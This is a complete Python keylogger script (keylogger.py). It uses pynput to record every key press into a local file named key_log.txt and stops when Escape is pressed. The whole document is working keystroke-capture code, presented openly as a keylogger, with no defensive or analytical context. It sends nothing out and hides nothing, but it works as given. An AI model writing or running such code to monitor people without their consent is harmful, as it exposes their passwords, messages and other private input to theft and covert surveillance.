# keylogger.py

from pynput.keyboard import Key, Listener

# Log file location
log_file = "key_log.txt"

# Function to write keystrokes to log file
def log_keystroke(key):
    with open(log_file, "a") as f:
        key_data = str(key).replace("'", "")  # Format the keystrokes
        if key == Key.space:
            f.write(" ")  # Space as blank
        elif key == Key.enter:
            f.write("\n")  # Newline for Enter key
        elif key == Key.backspace:
            f.write("<Backspace>")
        else:
            f.write(key_data)

# Function to stop the listener
def stop_listener(key):
    if key == Key.esc:  # Stop key is Escape
        return False

# Setup the listener
with Listener(on_press=log_keystroke, on_release=stop_listener) as listener:
    listener.join()
